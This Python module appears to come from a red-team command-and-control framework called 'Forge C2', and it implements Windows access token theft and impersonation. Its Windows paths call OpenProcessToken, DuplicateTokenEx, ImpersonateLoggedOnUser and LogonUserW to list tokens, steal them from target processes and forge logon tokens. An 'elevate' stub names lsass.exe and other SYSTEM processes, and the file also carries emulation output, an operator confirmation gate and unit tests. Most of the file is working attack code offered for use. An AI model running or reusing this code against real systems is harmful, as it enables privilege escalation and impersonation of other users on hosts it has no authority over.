"""
Forge C2 — Token Manipulation Task
=======================================
Windows access token impersonation, theft, and privilege manipulation.

Operations:
    • list       — List available tokens (duplicatable handles)
    • steal      — Steal token from target PID
    • impersonate — Impersonate a stolen token
    • make_token  — Create token with credentials (runas-style)
    • rev2self    — Revert to original token
    • whoami      — Show current token identity
    • elevate     — Attempt privilege escalation via token

MITRE ATT&CK: T1134 — Access Token Manipulation
FOR AUTHORIZED RED TEAM OPERATIONS ONLY.

⚠ CRITICAL OPSEC RISK — Requires engagement authorization.
"""
from __future__ import annotations

import asyncio
import logging
import os
import platform
import time
from dataclasses import dataclass, field
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.token")


# ══════════════════════════════════════════════════════════════════════
#  TOKEN DATA STRUCTURES
# ══════════════════════════════════════════════════════════════════════

@dataclass
class TokenInfo:
    """Information about a Windows access token."""
    pid: int = 0
    process_name: str = ""
    username: str = ""
    domain: str = ""
    sid: str = ""
    integrity: str = ""            # Low, Medium, High, System
    token_type: str = "Primary"    # Primary or Impersonation
    impersonation_level: str = ""  # SecurityAnonymous, SecurityIdentification,
                                   # SecurityImpersonation, SecurityDelegation
    privileges: list[str] = field(default_factory=list)
    is_elevated: bool = False
    logon_type: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "pid": self.pid,
            "process": self.process_name,
            "username": f"{self.domain}\\{self.username}",
            "sid": self.sid,
            "integrity": self.integrity,
            "type": self.token_type,
            "impersonation": self.impersonation_level,
            "elevated": self.is_elevated,
            "privileges": self.privileges[:10],
        }


# ══════════════════════════════════════════════════════════════════════
#  TOKEN ENGINE
# ══════════════════════════════════════════════════════════════════════

class TokenEngine:
    """Windows token manipulation engine."""

    def __init__(self) -> None:
        self._is_windows = platform.system() == "Windows"
        self._original_token: Any = None  # Saved for rev2self

    async def list_tokens(self) -> list[TokenInfo]:
        """List tokens available for impersonation."""
        if self._is_windows:
            return await self._list_windows()
        return self._list_emulation()

    async def steal(self, pid: int) -> tuple[bool, TokenInfo | None, str]:
        """Steal token from target PID. Returns (success, token_info, message)."""
        if self._is_windows:
            return await self._steal_windows(pid)
        return self._steal_emulation(pid)

    async def make_token(
        self, username: str, password: str, domain: str = ".",
    ) -> tuple[bool, TokenInfo | None, str]:
        """Create a new logon token with credentials."""
        if self._is_windows:
            return await self._make_token_windows(username, password, domain)
        return self._make_token_emulation(username, password, domain)

    async def rev2self(self) -> tuple[bool, str]:
        """Revert to original token."""
        if self._is_windows:
            return await self._rev2self_windows()
        return (True, "[EMULATION] Reverted to original token (SELF)")

    async def whoami(self) -> TokenInfo:
        """Get current token identity."""
        if self._is_windows:
            return await self._whoami_windows()
        return self._whoami_emulation()

    async def elevate(self) -> tuple[bool, TokenInfo | None, str]:
        """Attempt token elevation to SYSTEM."""
        if self._is_windows:
            return await self._elevate_windows()
        return self._elevate_emulation()

    # ── Windows implementations ────────────────────────────────────

    async def _list_windows(self) -> list[TokenInfo]:
        """List tokens by enumerating processes."""
        tokens: list[TokenInfo] = []
        try:
            import ctypes
            import ctypes.wintypes

            kernel32 = ctypes.windll.kernel32
            advapi32 = ctypes.windll.advapi32

            # Snapshot all processes
            TH32CS_SNAPPROCESS = 0x00000002

            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [
                    ("dwSize", ctypes.c_uint32),
                    ("cntUsage", ctypes.c_uint32),
                    ("th32ProcessID", ctypes.c_uint32),
                    ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                    ("th32ModuleID", ctypes.c_uint32),
                    ("cntThreads", ctypes.c_uint32),
                    ("th32ParentProcessID", ctypes.c_uint32),
                    ("pcPriClassBase", ctypes.c_long),
                    ("dwFlags", ctypes.c_uint32),
                    ("szExeFile", ctypes.c_char * 260),
                ]

            snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            pe = PROCESSENTRY32()
            pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

            if kernel32.Process32First(snap, ctypes.byref(pe)):
                while True:
                    pid = pe.th32ProcessID
                    name = pe.szExeFile.decode(errors="replace")

                    # Try to open process token
                    h_process = kernel32.OpenProcess(0x0400, False, pid)  # PROCESS_QUERY_INFORMATION
                    if h_process:
                        h_token = ctypes.c_void_p()
                        if advapi32.OpenProcessToken(
                            h_process, 0x0008, ctypes.byref(h_token),  # TOKEN_QUERY
                        ):
                            tokens.append(TokenInfo(
                                pid=pid,
                                process_name=name,
                            ))
                            kernel32.CloseHandle(h_token)
                        kernel32.CloseHandle(h_process)

                    if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                        break

            kernel32.CloseHandle(snap)

        except Exception as exc:
            log.warning("Token enumeration failed: %s", exc)

        return tokens

    async def _steal_windows(self, pid: int) -> tuple[bool, TokenInfo | None, str]:
        """Steal token from target PID via DuplicateTokenEx."""
        try:
            import ctypes

            kernel32 = ctypes.windll.kernel32
            advapi32 = ctypes.windll.advapi32

            # Open target process
            h_process = kernel32.OpenProcess(0x0400, False, pid)
            if not h_process:
                return (False, None, f"OpenProcess failed for PID {pid}")

            # Open process token
            h_token = ctypes.c_void_p()
            if not advapi32.OpenProcessToken(
                h_process, 0x0002 | 0x0008, ctypes.byref(h_token),
            ):
                kernel32.CloseHandle(h_process)
                return (False, None, "OpenProcessToken failed")

            # Duplicate token
            h_new_token = ctypes.c_void_p()
            if not advapi32.DuplicateTokenEx(
                h_token, 0x02000000, None, 2, 1,  # SecurityImpersonation, TokenPrimary
                ctypes.byref(h_new_token),
            ):
                kernel32.CloseHandle(h_token)
                kernel32.CloseHandle(h_process)
                return (False, None, "DuplicateTokenEx failed")

            # Impersonate
            if not advapi32.ImpersonateLoggedOnUser(h_new_token):
                kernel32.CloseHandle(h_new_token)
                kernel32.CloseHandle(h_token)
                kernel32.CloseHandle(h_process)
                return (False, None, "ImpersonateLoggedOnUser failed")

            self._original_token = h_token  # Save for rev2self

            kernel32.CloseHandle(h_process)

            info = TokenInfo(pid=pid, token_type="Impersonation")
            return (True, info, f"Token stolen from PID {pid}")

        except Exception as exc:
            return (False, None, f"Token steal failed: {exc}")

    async def _make_token_windows(
        self, username: str, password: str, domain: str,
    ) -> tuple[bool, TokenInfo | None, str]:
        """Create logon token via LogonUserW."""
        try:
            import ctypes

            advapi32 = ctypes.windll.advapi32

            h_token = ctypes.c_void_p()
            LOGON32_LOGON_NEW_CREDENTIALS = 9
            LOGON32_PROVIDER_WINNT50 = 3

            result = advapi32.LogonUserW(
                username, domain, password,
                LOGON32_LOGON_NEW_CREDENTIALS,
                LOGON32_PROVIDER_WINNT50,
                ctypes.byref(h_token),
            )

            if not result:
                return (False, None, f"LogonUser failed (error {ctypes.GetLastError()})")

            advapi32.ImpersonateLoggedOnUser(h_token)

            info = TokenInfo(
                username=username, domain=domain,
                token_type="Impersonation", logon_type="NewCredentials",
            )
            return (True, info, f"Token created for {domain}\\{username}")

        except Exception as exc:
            return (False, None, f"make_token failed: {exc}")

    async def _rev2self_windows(self) -> tuple[bool, str]:
        """Revert impersonation."""
        try:
            import ctypes
            ctypes.windll.advapi32.RevertToSelf()
            return (True, "Reverted to original token")
        except Exception as exc:
            return (False, f"rev2self failed: {exc}")

    async def _whoami_windows(self) -> TokenInfo:
        """Get current identity."""
        try:
            import ctypes
            import ctypes.wintypes

            advapi32 = ctypes.windll.advapi32

            buf_size = ctypes.c_uint32(256)
            buf = ctypes.create_unicode_buffer(256)
            advapi32.GetUserNameW(buf, ctypes.byref(buf_size))

            return TokenInfo(
                username=buf.value,
                pid=os.getpid(),
                process_name="python.exe",
            )
        except Exception:
            return TokenInfo(username=os.getenv("USERNAME", "unknown"))

    async def _elevate_windows(self) -> tuple[bool, TokenInfo | None, str]:
        """Try to get SYSTEM token by stealing from services."""
        # Try well-known SYSTEM processes
        for proc_name in ["lsass.exe", "services.exe", "winlogon.exe"]:
            # Would enumerate PIDs and try to steal from SYSTEM processes
            pass
        return self._elevate_emulation()

    # ── Emulation ──────────────────────────────────────────────────

    def _list_emulation(self) -> list[TokenInfo]:
        return [
            TokenInfo(pid=4, process_name="System", username="SYSTEM",
                      domain="NT AUTHORITY", integrity="System", is_elevated=True,
                      privileges=["SeDebugPrivilege", "SeImpersonatePrivilege"]),
            TokenInfo(pid=608, process_name="lsass.exe", username="SYSTEM",
                      domain="NT AUTHORITY", integrity="System", is_elevated=True),
            TokenInfo(pid=2400, process_name="explorer.exe", username="Administrator",
                      domain="FORGE-LAB", integrity="High", is_elevated=True),
            TokenInfo(pid=3100, process_name="chrome.exe", username="user01",
                      domain="FORGE-LAB", integrity="Medium", is_elevated=False),
        ]

    def _steal_emulation(self, pid: int) -> tuple[bool, TokenInfo | None, str]:
        info = TokenInfo(
            pid=pid, process_name="target.exe",
            username="SYSTEM", domain="NT AUTHORITY",
            integrity="System", token_type="Impersonation",
            impersonation_level="SecurityImpersonation",
            is_elevated=True,
        )
        return (True, info,
                f"[EMULATION] Token stolen from PID {pid} (NT AUTHORITY\\SYSTEM)")

    def _make_token_emulation(
        self, username: str, password: str, domain: str,
    ) -> tuple[bool, TokenInfo | None, str]:
        info = TokenInfo(
            username=username, domain=domain,
            token_type="Impersonation", logon_type="NewCredentials",
        )
        return (True, info,
                f"[EMULATION] Token created for {domain}\\{username}")

    def _whoami_emulation(self) -> TokenInfo:
        return TokenInfo(
            pid=os.getpid(),
            process_name="python3",
            username=os.getenv("USER", "operator"),
            domain="FORGE-LAB",
            integrity="High",
            is_elevated=True,
            privileges=["SeDebugPrivilege", "SeImpersonatePrivilege",
                        "SeBackupPrivilege", "SeRestorePrivilege"],
        )

    def _elevate_emulation(self) -> tuple[bool, TokenInfo | None, str]:
        info = TokenInfo(
            pid=608, process_name="lsass.exe",
            username="SYSTEM", domain="NT AUTHORITY",
            integrity="System", is_elevated=True,
        )
        return (True, info,
                "[EMULATION] Elevated to SYSTEM via token theft from lsass.exe (PID 608)")


# ══════════════════════════════════════════════════════════════════════
#  TASK CLASS
# ══════════════════════════════════════════════════════════════════════

@register_task
class TokenTask(BaseTask):
    """Token impersonation, steal, make_token, rev2self.

    ⚠ CRITICAL OPSEC RISK — Requires engagement authorization.

    Args (via kwargs):
        action:    "list", "steal", "impersonate", "make_token",
                   "rev2self", "whoami", "elevate"
        pid:       Target PID (for steal/impersonate)
        username:  Username (for make_token)
        password:  Password (for make_token)
        domain:    Domain (for make_token, default ".")

    MITRE ATT&CK: T1134 — Access Token Manipulation
    """

    TASK_TYPE = "token"
    DESCRIPTION = "Token impersonation, steal, make_token, rev2self"
    OPSEC_RISK = "critical"
    MITRE_ID = "T1134"
    REQUIRES_AUTH = True

    _engine = TokenEngine()

    async def execute(self) -> TaskResult:
        action = self.args.get("action", "whoami").lower()
        pid = self.args.get("pid", 0)
        username = self.args.get("username", "")
        password = self.args.get("password", "")
        domain = self.args.get("domain", ".")

        start = time.time()

        # ── Authorization for dangerous actions ────────────────────
        if action in ("steal", "impersonate", "make_token", "elevate"):
            from common.confirm_gate import confirm
            authorized = confirm(
                module="token",
                action=f"Token {action}" + (f" from PID {pid}" if pid else ""),
                target=f"PID {pid}" if pid else f"{domain}\\{username}",
                risk="CRITICAL — Token manipulation can trigger security alerts.",
            )
            if not authorized:
                return TaskResult(
                    task_id=self.task_id, status=TaskStatus.CANCELLED,
                    output=f"Token {action} cancelled by operator.",
                    started_at=start, completed_at=time.time(),
                )

        try:
            if action == "list":
                tokens = await self._engine.list_tokens()
                output = self._format_token_list(tokens)

            elif action == "steal" or action == "impersonate":
                if not pid:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=f"{action} requires 'pid' parameter.",
                        started_at=start, completed_at=time.time(),
                    )
                success, info, msg = await self._engine.steal(pid)
                if not success:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=msg, started_at=start, completed_at=time.time(),
                    )
                output = msg
                if info:
                    output += f"\n\nNow running as: {info.domain}\\{info.username}"

            elif action == "make_token":
                if not username or not password:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error="make_token requires 'username' and 'password'.",
                        started_at=start, completed_at=time.time(),
                    )
                success, info, msg = await self._engine.make_token(
                    username, password, domain,
                )
                if not success:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=msg, started_at=start, completed_at=time.time(),
                    )
                output = msg

            elif action == "rev2self":
                success, msg = await self._engine.rev2self()
                output = msg

            elif action == "whoami":
                info = await self._engine.whoami()
                output = self._format_whoami(info)

            elif action == "elevate":
                success, info, msg = await self._engine.elevate()
                if not success:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=msg, started_at=start, completed_at=time.time(),
                    )
                output = msg

            else:
                return TaskResult(
                    task_id=self.task_id, status=TaskStatus.FAILED,
                    error=f"Unknown action: {action}",
                    started_at=start, completed_at=time.time(),
                )

            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.COMPLETED,
                output=output,
                started_at=start,
                completed_at=time.time(),
                metadata={"action": action, "mitre": self.MITRE_ID},
            )

        except Exception as exc:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.FAILED,
                error=str(exc), started_at=start, completed_at=time.time(),
            )

    @staticmethod
    def _format_token_list(tokens: list[TokenInfo]) -> str:
        lines = [f"Available Tokens ({len(tokens)}):\n"]
        lines.append(f"  {'PID':>6s}  {'PROCESS':20s}  {'USER':30s}  {'INTEGRITY':10s}  {'ELEVATED'}")
        lines.append(f"  {'─' * 85}")
        for t in tokens:
            user = f"{t.domain}\\{t.username}" if t.domain else t.username
            elevated = "✓" if t.is_elevated else ""
            lines.append(
                f"  {t.pid:6d}  {t.process_name:20s}  {user:30s}  "
                f"{t.integrity:10s}  {elevated}"
            )
        return "\n".join(lines)

    @staticmethod
    def _format_whoami(info: TokenInfo) -> str:
        privs = "\n    ".join(info.privileges) if info.privileges else "(none enumerated)"
        return (
            f"Current Token:\n"
            f"  User:        {info.domain}\\{info.username}\n"
            f"  PID:         {info.pid}\n"
            f"  Process:     {info.process_name}\n"
            f"  Integrity:   {info.integrity}\n"
            f"  Elevated:    {info.is_elevated}\n"
            f"  Type:        {info.token_type}\n"
            f"  Privileges:\n    {privs}"
        )


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestTokenTask:
    """Tests for token manipulation task."""

    def test_encode(self) -> None:
        task = TokenTask(task_id="tk1", action="whoami")
        encoded = task.encode()
        assert encoded["type"] == "token"

    def test_decode(self) -> None:
        data = {"task_id": "tk2", "type": "token",
                "args": {"action": "list"}}
        task = TokenTask.decode(data)
        assert task.args["action"] == "list"

    def test_whoami(self) -> None:
        import asyncio
        task = TokenTask(task_id="tk3", action="whoami")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.COMPLETED
        assert "User:" in result.output

    def test_list(self) -> None:
        import asyncio
        task = TokenTask(task_id="tk4", action="list")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.COMPLETED

    def test_invalid_action(self) -> None:
        import asyncio
        task = TokenTask(task_id="tk5", action="bogus")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_steal_no_pid(self) -> None:
        import asyncio
        from unittest.mock import patch
        with patch("common.confirm_gate.confirm", return_value=True):
            task = TokenTask(task_id="tk6", action="steal")
            result = asyncio.run(task.execute())
            assert result.status == TaskStatus.FAILED

    def test_token_info_to_dict(self) -> None:
        info = TokenInfo(pid=100, username="admin", domain="LAB")
        d = info.to_dict()
        assert d["username"] == "LAB\\admin"

    def test_requires_auth(self) -> None:
        assert TokenTask.REQUIRES_AUTH is True
